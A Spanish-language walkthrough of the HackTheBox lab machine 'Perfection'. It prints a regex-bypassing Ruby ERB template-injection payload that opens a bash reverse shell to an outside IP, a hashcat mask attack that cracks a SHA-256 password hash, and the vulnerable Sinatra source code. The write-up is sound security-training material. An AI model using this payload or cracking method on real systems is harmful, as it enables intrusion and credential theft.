---
title: "Máquina Perfection"
description: "Resolución de la máquina Perfection de HackTheBox"
tags: ["Regex Bypass", "SSTI", "Password guessing"]
categories: ["HackTheBox", "Easy", "Linux"]
logo: "/assets/writeups/perfection/logo.webp"
---

Un sitio de cálculo de notas es vulnerable a una inyección SSTI, que utilizaremos para el acceso inicial, luego simplemente escalaremos privilegios adivinando la contraseña de un usuario.

## Reconocimiento

La máquina solo tiene dos puertos abiertos

```bash
# Nmap 7.95 scan initiated Thu Jul  4 13:08:30 2024 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv 10.10.11.253
Nmap scan report for 10.10.11.253
Host is up, received user-set (0.85s latency).
Scanned at 2024-07-04 13:08:30 -04 for 219s
Not shown: 51316 closed tcp ports (reset), 14217 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Jul  4 13:12:09 2024 -- 1 IP address (1 host up) scanned in 219.29 seconds
```

El sitio web en el puerto 80 simplemente contiene una página para que los estudiantes calculen su grado de notas básandose en los pesos de las categorías y porcentajes.

![Website](/assets/writeups/perfection/1.png)

Evidentemente hay un apartado para hacer lo que dice la página, y nos da 5 categorías para rellenar con su peso y grado... veamos que hacemos con esto

## Intrusión

Como seguro ya habrás notado, esto parece que fue programado por gente que no es muy experimentada que digamos con tan solo ver como tenemos que ingresar las notas, por lo que jugemos un poco con ella a ver que sucede

Intentado colocar nuestras cosas a nivel de la petición HTTP, vemos que hay filtros:

![Blocked](/assets/writeups/perfection/2.png)

Asumiendo que están usando regex y conociendo como funcionan, podemos intentar bypassear esta verificación agregando un salto de línea justo al lado de lo que queremos introducir, y efectivamente funciona:

![Bypassed](/assets/writeups/perfection/3.png)

Se ve que podemos inyectar etiquetas de templates Ruby para ejecutar código, por lo que ahora simplemente podemos spawnear un proceso con `Kernel#spawn` que nos envie una consola interactiva

`<%= Kernel.spawn "bash -c 'bash -i >& /dev/tcp/10.10.14.141/443 0>&1'" %>`

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.253 49624
bash: cannot set terminal process group (1027): Inappropriate ioctl for device
bash: no job control in this shell
susan@perfection:~/ruby_app$ script /dev/null -c bash # Inicia un nuevo proceso que aloje una tty
script /dev/null -c bash
Script started, output log file is '/dev/null'.
susan@perfection:~/ruby_app$ ^Z # CTRL + Z
[2]  + 19230 suspended  nc -lvnp 443

❯ stty raw -echo; fg # Pasar los controles de la terminal al proceso
[2]  - 19230 continued  nc -lvnp 443
                                    reset xterm # Reiniciar el tipo de terminal
susan@perfection:~/ruby_app$ export TERM=xterm-256color # Establecer la variable de entorno que identifica el tipo de terminal para tenerla colorida.
```

En el directorio personal de este usuario podemos encontrar la primera flag, por lo que ya podemos tomarla:

```bash
susan@perfection:~/ruby_app$ cd
susan@perfection:~$ ls
Migration  ruby_app  user.txt
susan@perfection:~$ cat user.txt
b3a40cb71e3628b0d18461881c******
```

## Escalada de privilegios

Tenemos un correo:

```bash
susan@perfection:~$ ls -la /var/mail
total 12
drwxrwsr-x  2 root mail  4096 May 14  2023 .
drwxr-xr-x 13 root root  4096 Oct 27  2023 ..
-rw-r-----  1 root susan  625 May 14  2023 susan
susan@perfection:~$ cat /var/mail/susan
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

Estos estudiantes antes eran parte de PupilPath, que haciendo OSINT podemos ver que cerró hace varios años por una brecha de seguridad en la que expusieron muchos datos PII (Personal Identifiable Info), ahora migraron a Jupiter Grades y han migrado sus credenciales al formato que podemos leer en el mail. Sabiendo esto, podemos armarnos un diccionario para cosas que encontremos por ahí; y justamente hay una base de datos que tiene contraseña en formato hash

```bash
susan@perfection:~$ cd Migration
susan@perfection:~/Migration$ ls
susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .schema
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
);
pupilpath_credentials.db
sqlite> select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

Tomaremos la de susan por probar. El formato de estos hashes puede ser reconocido como SHA2-256.

Para crear un diccionario fácilmente, podemos utilizar el modo 3 de Hashcat que nos permite hacer permutaciones con símbolos y una palabra predefinada, de este modo:

`hashcat -a 3 -m 1400 hash "susan_nasus_?d?d?d?d?d?d?d?d?d?d"`

Luego de un ratito de correr el hashcat, obtendremos la contraseña de Susan.

```bash
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
Time.Started.....: Thu Jul  4 14:06:21 2024 (4 mins, 55 secs)
Time.Estimated...: Thu Jul  4 14:11:16 2024 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1106.9 kH/s (0.50ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 324558848/1000000000 (32.46%)
Rejected.........: 0/324558848 (0.00%)
Restore.Point....: 324556800/1000000000 (32.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Host Generator + PCIe
Candidates.#1....: susan_nasus_126824210 -> susan_nasus_803824210
Hardware.Mon.#1..: Temp: 72c Util: 47%

Started: Thu Jul  4 14:06:18 2024
Stopped: Thu Jul  4 14:11:17 2024
```

y al usarla en la máquina para ver los privilegios sudo, pues...

```bash
susan@perfection:~/Migration$ sudo -l
[sudo] password for susan: 
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
```

Lo que normalmente tiene asignado un administrador, con esto ya simplemente podemos convertirnos en root y tomar la última flag.

```bash
susan@perfection:~/Migration$ sudo su
root@perfection:/home/susan/Migration# cd /root
root@perfection:~# ls
root.txt
root@perfection:~# cat root.txt
50d3a9111a6e11723d28b387b9******
```

## Extra

Este el código de la aplicación web en cuestión

```rb
require 'sinatra'
require 'erb'
set :show_exceptions, false

configure do
    set :bind, '127.0.0.1'
    set :port, '3000'
end

get '/' do
    index_page = ERB.new(File.read 'views/index.erb')
    response_html = index_page.result(binding)
    return response_html
end

get '/about' do
    about_page = ERB.new(File.read 'views/about.erb')
    about_html = about_page.result(binding)
    return about_html
end

get '/weighted-grade' do
    calculator_page = ERB.new(File.read 'views/weighted_grade.erb')
    calcpage_html = calculator_page.result(binding)
    return calcpage_html
end

post '/weighted-grade-calc' do
    total_weight = params[:weight1].to_i + params[:weight2].to_i + params[:weight3].to_i + params[:weight4].to_i + params[:weight5].to_i
    if total_weight != 100
        @result = "Please reenter! Weights do not add up to 100."
        erb :'weighted_grade_results'
    elsif params[:category1] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category2] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category3] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category4] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category5] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:grade1] =~ /^(?:100|\d{1,2})$/ && params[:grade2] =~ /^(?:100|\d{1,2})$/ && params[:grade3] =~ /^(?:100|\d{1,2})$/ && params[:grade4] =~ /^(?:100|\d{1,2})$/ && params[:grade5] =~ /^(?:100|\d{1,2})$/ && params[:weight1] =~ /^(?:100|\d{1,2})$/ && params[:weight2] =~ /^(?:100|\d{1,2})$/ && params[:weight3] =~ /^(?:100|\d{1,2})$/ && params[:weight4] =~ /^(?:100|\d{1,2})$/ && params[:weight5] =~ /^(?:100|\d{1,2})$/
        @result = ERB.new("Your total grade is <%= ((params[:grade1].to_i * params[:weight1].to_i) + (params[:grade2].to_i * params[:weight2].to_i) + (params[:grade3].to_i * params[:weight3].to_i) + (params[:grade4].to_i * params[:weight4].to_i) + (params[:grade5].to_i * params[:weight5].to_i)) / 100 %>\%<p>" + params[:category1] + ": <%= (params[:grade1].to_i * params[:weight1].to_i) / 100 %>\%</p><p>" + params[:category2] + ": <%= (params[:grade2].to_i * params[:weight2].to_i) / 100 %>\%</p><p>" + params[:category3] + ": <%= (params[:grade3].to_i * params[:weight3].to_i) / 100 %>\%</p><p>" + params[:category4] + ": <%= (params[:grade4].to_i * params[:weight4].to_i) / 100 %>\%</p><p>" + params[:category5] + ": <%= (params[:grade5].to_i * params[:weight5].to_i) / 100 %>\%</p>").result(binding)
        erb :'weighted_grade_results'
    else
        @result = "Malicious input blocked"
        erb :'weighted_grade_results'
    end
end
```
{: file="main.rb" }

Es posible bypassear la verifiación de `/weighted-grade-calc` ya que la regex `/^[a-zA-Z0-9\/ ]+$/` solamente verifica que la primera linea contenga solo carácteres alfanúmericos, pero no comprueba las siguientes lineas de la entrada si es que hay. Encima que el uso de la estructura de control `if..elsif..else` es bastante mejorable.